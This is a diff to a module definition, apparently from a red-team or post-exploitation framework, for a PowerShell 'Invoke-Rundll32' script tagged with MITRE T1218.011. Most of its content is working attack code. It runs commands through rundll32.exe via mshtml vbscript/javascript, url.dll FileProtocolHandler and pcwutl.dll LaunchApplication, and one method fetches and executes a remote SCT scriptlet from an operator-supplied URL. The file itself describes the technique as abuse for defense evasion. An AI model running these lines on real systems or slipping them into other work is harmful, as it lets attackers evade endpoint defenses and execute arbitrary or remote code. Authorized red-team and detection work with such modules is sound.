@@ -5,11 +5,10 @@ authors:
     link: https://twitter.com/Cx01N_
 description: |
   Executes commands via rundll32.exe proxy execution using various
-  DLL functions. Supports multiple methods including advpack.dll
-  LaunchINFSection, syssetup.dll SetupInfObjectInstallAction,
-  javascript and vbscript execution via mshtml, and URL.dll
-  FileProtocolHandler. Rundll32 is a signed Microsoft binary
-  commonly abused for defense evasion.
+  DLL functions. Supports multiple methods including vbscript and
+  javascript execution via mshtml, URL.dll FileProtocolHandler,
+  and pcwutl.dll LaunchApplication. Rundll32 is a signed Microsoft
+  binary commonly abused for defense evasion.
 software: ''
 tactics: [TA0005]
 techniques: [T1218.011]
@@ -25,8 +24,8 @@ options:
   - name: Method
     description: >-
       Rundll32 execution method to use.
-    required: false
-    value: 'vbscript'
+    required: true
+    value: 'url'
     suggested_values:
       - vbscript
       - javascript
@@ -34,13 +33,16 @@ options:
       - pcwutl
   - name: Command
     description: Command or executable to run.
-    required: false
+    required: true
     value: 'calc.exe'
   - name: ScriptUrl
     description: >-
-      URL to remote SCT file (used with javascript method).
+      URL to remote SCT file.
     required: false
     value: ''
+    depends_on:
+      - name: Method
+        values: ['javascript']
   - name: OutputFunction
     description: PowerShell output function to use.
     required: false
@@ -58,37 +60,68 @@ script: |
 
       switch ($Method.ToLower()) {
           "vbscript" {
-              $cmdLine = "rundll32.exe vbscript:`"\..\mshtml,RunHTMLApplication `"+String(CreateObject(`"WScript.Shell`").Run(`"$Command`"),0)"
               Write-Output "[*] Executing via VBScript method..."
-              cmd /c $cmdLine 2>&1
-              Write-Output "[+] Executed: rundll32 vbscript method with command: $Command"
+              try {
+                  $psi = New-Object System.Diagnostics.ProcessStartInfo
+                  $psi.FileName = "cmd.exe"
+                  $psi.Arguments = '/c rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("Wscript.Shell").Run("' + $Command + '"),0)'
+                  $psi.UseShellExecute = $false
+                  $proc = [System.Diagnostics.Process]::Start($psi)
+                  $proc.WaitForExit(5000)
+                  Write-Output "[+] Executed: rundll32 vbscript method with command: $Command (PID: $($proc.Id))"
+              } catch {
+                  Write-Output "[-] Failed to start process: $_"
+              }
           }
           "javascript" {
               if (-not $ScriptUrl) {
                   Write-Output "[-] ScriptUrl is required for javascript method."
                   return
               }
-              $cmdLine = "rundll32.exe javascript:`"\..\mshtml,RunHTMLApplication `";document.write();GetObject(`"script:$ScriptUrl`").Exec();window.close();"
               Write-Output "[*] Executing via JavaScript method..."
-              cmd /c $cmdLine 2>&1
-              Write-Output "[+] Executed: rundll32 javascript method with URL: $ScriptUrl"
+              try {
+                  $psi = New-Object System.Diagnostics.ProcessStartInfo
+                  $psi.FileName = "cmd.exe"
+                  $psi.Arguments = '/c rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:' + $ScriptUrl + '").Exec();window.close();'
+                  $psi.UseShellExecute = $false
+                  $proc = [System.Diagnostics.Process]::Start($psi)
+                  $proc.WaitForExit(5000)
+                  Write-Output "[+] Executed: rundll32 javascript method with URL: $ScriptUrl (PID: $($proc.Id))"
+              } catch {
+                  Write-Output "[-] Failed to start process: $_"
+              }
           }
           "url" {
               Write-Output "[*] Executing via URL.dll FileProtocolHandler..."
-              $result = rundll32.exe url.dll,FileProtocolHandler $Command 2>&1
-              Write-Output "[+] Executed: rundll32.exe url.dll,FileProtocolHandler $Command"
-              if ($result) { Write-Output $result }
+              try {
+                  $psi = New-Object System.Diagnostics.ProcessStartInfo
+                  $psi.FileName = "rundll32.exe"
+                  $psi.Arguments = "url.dll,FileProtocolHandler $Command"
+                  $psi.UseShellExecute = $false
+                  $proc = [System.Diagnostics.Process]::Start($psi)
+                  $proc.WaitForExit(5000)
+                  Write-Output "[+] Executed: rundll32.exe url.dll,FileProtocolHandler $Command (PID: $($proc.Id))"
+              } catch {
+                  Write-Output "[-] Failed to start process: $_"
+              }
           }
           "pcwutl" {
               Write-Output "[*] Executing via pcwutl.dll LaunchApplication..."
-              $result = rundll32.exe pcwutl.dll,LaunchApplication $Command 2>&1
-              Write-Output "[+] Executed: rundll32.exe pcwutl.dll,LaunchApplication $Command"
-              if ($result) { Write-Output $result }
+              try {
+                  $psi = New-Object System.Diagnostics.ProcessStartInfo
+                  $psi.FileName = "rundll32.exe"
+                  $psi.Arguments = "pcwutl.dll,LaunchApplication $Command"
+                  $psi.UseShellExecute = $false
+                  $proc = [System.Diagnostics.Process]::Start($psi)
+                  $proc.WaitForExit(5000)
+                  Write-Output "[+] Executed: rundll32.exe pcwutl.dll,LaunchApplication $Command (PID: $($proc.Id))"
+              } catch {
+                  Write-Output "[-] Failed to start process: $_"
+              }
           }
           default {
               Write-Output "[-] Invalid method: $Method."
           }
       }
   }
-script_end: Invoke-Rundll32 -Method "{{ Method }}" -Command "{{ Command }}" -ScriptUrl
-  "{{ ScriptUrl }}" {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
+script_end: Invoke-Rundll32 {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
